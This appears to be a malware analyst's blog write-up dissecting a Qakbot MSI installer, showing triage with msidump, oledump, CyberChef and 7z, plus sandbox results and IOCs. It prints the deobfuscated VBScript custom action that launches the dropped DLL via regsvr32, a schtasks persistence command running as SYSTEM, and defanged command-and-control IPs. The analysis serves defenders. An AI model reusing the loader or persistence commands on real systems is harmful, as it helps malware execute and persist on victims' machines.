---
title: "QakbotMSI"
date: 2022-06-21T17:54:34-04:00
draft: false
---

### Executive Summary

- In mid-April 2022, Mandiant observed UNC2500 campaigns using MSI packages to distribute Qakbot payloads.
- This change comes shortly after Microsoft’s announcement that macros from Office documents downloaded from the internet (ZoneIdentifier ADS) will be blocked by default.
- This new payload uses a botnet ID **AA,** which is unique from previous campaigns that have used **tr**, **cullinan**, and **cullinan01**.
- Distribution came from phishing emails containing a malicious link from either OneDrive or files hosted on compromised websites that downloads a ZIP archive. That archive contains a Windows Installer Package (MSI) file. When the user executes the MSI file, a Qakbot DLL contained within an embedded Windows Cabinet File (CAB)  is executed.

### Analysis

This sample was originally published by @pr0xylife. 

I downloaded the MSI sample on both Remnux and FlareVM for static and dynamic analysis respectively. 

[https://twitter.com/pr0xylife/status/1521445754216267776](https://twitter.com/pr0xylife/status/1521445754216267776)

First is to just look at the file properties to see if there are any immediate indicators. An organization and an email. 

![Untitled](/Qakbot/Untitled.png)

`msidump` will dump all streams and tables from the MSI file. `oledump` can also be used and I’ll show an example of that too, but I found `msidump` just makes things a bit easier.

### Streams and Tables

Every .idt file below is a table. More specifically, an Installer Database Table. Using the `-s` and `-t` flag, **_Tables** and **_Streams** are outputted below. 

**_Tables** table lists all tables (.idt files) in the database. 

**_Streams** table lists embedded OLE data streams. It is a temporary table created only when referenced by a SQL statement. 

**Binary** folder is used to store data from `Binary.idt`. The binary table holds binary data for items like bitmaps, animations, and icons. It’s also used to store data for **custom actions** (more on this later)**.** 

### msidump

![Untitled](/Qakbot/Untitled%201.png)

![Untitled](/Qakbot/Untitled%202.png)

- `*.idt` are database files containing table data.
- `Binary/` and `_Streams/` hold executable and stream data.

### Oledump Example

`msidump` above gave a lot of useful information quickly, but as stated, MSI files contain OLE stream data, so `oledump` could be used as well.

Most of the text below is unreadable (for those that aren’t bilingual) but what’s more important is the middle column signifying stream byte size. 

![Untitled](/Qakbot/Untitled%203.png)

Going for the largest stream first seems profitable, so I’ll start with 4. 

![Untitled](/Qakbot/Untitled%204.png)

Ignore the broken pipe error. Main thing to focus on is the `MSCF` file signature which is a **Microsoft Cabinet Archive File.** Keep note of this.

Next is stream 5, but I won’t go further since the rest of the analysis was done using `msidump`. 

![Untitled](/Qakbot/Untitled%205.png)

The `BM` file signature is for bitmap images. Possibly for something in the MSI application window? 

Anyways, that was just an example of using `oledump.py`. It’s a bit more tedious to get table data, but it’s still possible. I’d just rather have all files readily available to look at. Back to the real task.

### More Tables

The **CustomAction** file can often contain malicious code for further execution, so that’s a good one to check first. 

![Untitled](/Qakbot/Untitled%206.png)

`DIRCA_TARGETDIR` notes something gets installed to the `%LOCALAPPDATA%\ProductName` folder. This at least gives a location to check on Windows machines for file creation. 

Note: [ProductName] is a placeholder for the actual package getting installed. As seen in the embedded tweet above, the package is called SetupTest, so something will evidently get installed to `%localappdata%\SetupTest`.  

That line above `DIRCA_TARGETDIR` points to a binary stream which may give more details about the action. 

Listing the stream data gives some obfuscated output.

![Untitled](/Qakbot/Untitled%207.png)

But thanks to this [tweet](https://twitter.com/ankit_anubhav/status/1521473716332339200?s=20&t=Bgp9wbsMNh2-k3FyXotADQ), a few find/replace operations in CyberChef can clear up the output a bit. Luckily this stream was lightly obfuscated. 

![Untitled](/Qakbot/Untitled%208.png)

Cleaned up output. Looking at line 4, now we know the name of the directory and a specific file written to it. This eases the dynamic analysis a bit on the Windows machine. 

```jsx
EVUCQUJ8D4 = EVUCQUJ8D4 & "VZUMLKCQLE = VZUMLKCQLE & ""Set objShell = CreateObject( """"WScript.Shell"""" )"" & Vbcrlf" & Vbcrlf
EVUCQUJ8D4 = EVUCQUJ8D4 & "VZUMLKCQLE = VZUMLKCQLE & ""Dim reg"" & Vbcrlf" & Vbcrlf
EVUCQUJ8D4 = EVUCQUJ8D4 & "VZUMLKCQLE = VZUMLKCQLE & ""reg = """"regsvr32.exe """""" & Vbcrlf" & Vbcrlf
EVUCQUJ8D4 = EVUCQUJ8D4 & "VZUMLKCQLE = VZUMLKCQLE & ""objShell.run reg & objShell.ExpandEnvironmentStrings(""""%localappdata%"""" & """"\SetupTest\"""" & """"5.dll"""")"" & Vbcrlf" & Vbcrlf
EVUCQUJ8D4 = EVUCQUJ8D4 & "VZUMLKCQLE = Replace(VZUMLKCQLE, """", """")" & Vbcrlf
EVUCQUJ8D4 = EVUCQUJ8D4 & "Execute VZUMLKCQLE" & Vbcrlf
EVUCQUJ8D4 = Replace(EVUCQUJ8D4, "", "")
```

Next is the Property table. 

![Untitled](/Qakbot/Untitled%209.png)

Nothing...time to switch to `_Streams`. Sometimes the Manufacturer key can list interesting details, but not this time.

![Untitled](/Qakbot/Untitled%2010.png)

A **Microsoft Archive Cabinet File**? Where was that seen before? (hint: oledump)

Since it’s an archive file, time to use 7z to extract it.

![Untitled](/Qakbot/Untitled%2011.png)

Finally getting somewhere. A new file (`_699ADF8C0A7E43ED9D8607CA4CFAFB26`) was extracted and it is a PE32 executable DLL. This further proves the output from that obfuscated code in CyberChef. 

After grabbing the MD5 of the DLL, it appears on MalwareBazaar.

![Untitled](/Qakbot/Untitled%2012.png)

Remember above how the CustomAction.idt file showed a target directory. Well...

![Untitled](/Qakbot/Untitled%2013.png)

There’s the same .dll pulled from the `_Streams` directory. `SetupTest` is the ProductName within `LocalAppDataFolder\ProductName`. 

The sample is heavily packed with an entropy of 7.69 so I’ll view sandbox details instead. The sample on intezer was downloaded to `%localappdata%\Temp` instead of `%localappdata%\SetupTest` but besides that, everything else is the same. 

[](https://analyze.intezer.com/analyses/42429a7f-36f2-4977-909b-ba67d0398810/genetic-analysis)

```jsx
"C:\Windows\System32\rundll32.exe" "C:\Users\<USER>\AppData\Local\Temp\<ANALYZED-FILE-NAME>",#1
	C:\Windows\SysWOW64\explorer.exe
		"C:\Windows\system32\schtasks.exe" /Create /RU "NT AUTHORITY\SYSTEM" /tn okebdbmlat /tr "regsvr32.exe -s \"C:\Users\<USER>\AppData\Local\Temp\<ANALYZED-FILE-NAME>\"" /SC ONCE /Z /ST 19:48 /ET 20:00
			C:\Windows\system32\svchost.exe -k netsvcs
```

### Network Activity

Using FakeNetNG, I was able to capture some IPs albeit with different host IDs but sharing the same ASN. So new IOCs!

24.55.67[.]41
82.152.39[.]49
92.132.172[.]110
186.64.67[.]30
203.122.46[.]188

### Conclusion

This Qakbot sample shows threat actors are moving fast to find new infection vectors that aren’t Office macros given the recent crackdown from Microsoft. I showed a few ways to pull details from an MSI file and luckily even got some new IOCs. Qakbot isn’t the first to adapt to this though. Prior MSI files include:

- [Arkei](https://malpedia.caad.fkie.fraunhofer.de/details/win.arkei_stealer)
- [NjRAT](https://malpedia.caad.fkie.fraunhofer.de/details/win.njrat)
- [STRRAT](https://malpedia.caad.fkie.fraunhofer.de/details/jar.strrat)

---

### IOCs

[Qakbot/Qakbot_AA_03.05.2022.txt at main · pr0xylife/Qakbot](https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_AA_03.05.2022.txt)

### References

[MalwareBazaar | Browse malware samples](https://bazaar.abuse.ch/sample/8cc8f32b2f44e84325e5153ec4fd60c31a35884220e7c36b753550356d6a25c8/)

[MalwareBazaar | Browse malware samples](https://bazaar.abuse.ch/sample/0150eb84d16f0330b2952c9c722fbf55e47d9697b27de9335de6113556e9b317/)

[Filesec.io](https://filesec.io/msi)

[Filesec.io](https://filesec.io/cab)

[Database Tables - Win32 apps](https://docs.microsoft.com/en-us/windows/win32/msi/database-tables)

[Analyzing a Stealer MSI using msitools](https://forensicitguy.github.io/analyzing-stealer-msi-using-msitools/)